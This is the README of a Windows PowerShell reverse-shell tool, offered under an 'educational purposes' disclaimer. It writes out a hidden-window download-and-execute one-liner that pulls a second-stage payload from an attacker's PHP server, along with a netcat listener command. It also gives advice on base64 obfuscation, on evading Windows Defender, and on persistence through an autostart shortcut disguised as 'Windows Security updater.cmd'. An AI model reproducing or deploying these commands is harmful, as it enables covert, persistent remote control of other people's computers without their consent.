# Windows Reverse Shell
 
DISCLAIMER: This software is for educational purposes only. This software should not be used for illegal activity. The author is not responsible for its use.


## Description

This software can be used to gain a remote shell on an external Windows-system that supports Powershell (Windows 7 and later). It works by you executing an initial payload, which connects to a server containing the actual/second stage payload. This will circumvent Windows defender.

As soon as the script is injected, it will constantly loop and try to connect to your system. Start your listener and wait a maximum of 10 seconds for the remote shell to connect. Once disconneced, you will not get to connect to it again. You can enable Autostart to get another connection once the "client" restarts his pc.

Despite the script trying to remove its traces (from autostart etc), i did not check if windows (event) logs pick up on this. So please dont do things you shouldnt be doing.

## Configuration

You can either edit "payloadtemplate.ps1.txt" and hardcode what are currently placeholders (`%autostart%`, `%ip%` & `%port%`) to place the file anywhere on the internet and not have to use an ip/domain that belongs to you (because it will show in the taskmanager) - or you use script.php on a webserver of your choice and dynamically generate payloads without changing anything.

For the latter option, just place `script.php` and `payloadtemplate.ps1.txt` next to each other on a webserver and make sure PHP is actually allowed. Some cheap hosts have it disabled.

## Usage

You need to modify the code the "client" runs so their terminal can build a connection to yours.

`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://myurl.com/script.php?i=xxx.xxx.xxx&p=xxxx')"`

To create a layer of obsucation, you can encrypt this string in base64 on sites [like these](https://raikia.com/tool-powershell-encoder/). Make sure to read the notes down below!

You can listen to the shell by using `nc -nlvp PORT`. You need to have nc (netcat) installed and change `PORT` to whatever port you made the "client" ping to.

### Arguments

script.php has 2 required arguments and one optional:
- i -> the ip adress the client sends the terminal data to (your pc/server). REQUIRED
- p -> the port the clients terminal tries to connect to (your pc/server). REQUIRED
- a -> weather we write the script to the clients autostart (does not require a value). OPTIONAL

#### About autostart

Since we do not have Admin priviliges, we can not edit the registry or place the payload into the Autostart folder. We need to find a folder where we can place files to and then create a shortcut into the autostart folder. For some reason shortcuts are allowed. **This however will open up a notification for a few seconds that this program is now enabled on boot.** Other than that, you can still find the file manually and you can also see it in the taskmanager under "autostart" as `Windows Security updater.cmd` with no icon. If you want to hide it a little better, get admin rights and figure something out or compile the cmd file to an exe on the clients pc and add an icon and meta data.

If you read "NOTES" you might want to disable autostart on a client that its already enabled on. Just connect to the client and execute the payload again but this time without the autostart argument and on a different port. Close your current session, listen to the new port and once connected, type `exit`. This will remove all traces of the autostart and terminate all running processes.

## NOTES:

As long as the the payload is running and searchinf for a shell, you can see the url to the server if you really search for it in the taskmanager. If you have obfuscated the command into base64, you will still be able to the the decoded url in the taskmanager.

If you execute the payload, the taskmanager will list the powershell task till you connect to it. It gets terminated once the shell terminates. If you have enabled autostart in the payload, the client will **always** run this process. So this might not be what you want when trying to be stealthy. Read in "About autostart" how to disable it again.

## DEMO:
![](display.gif)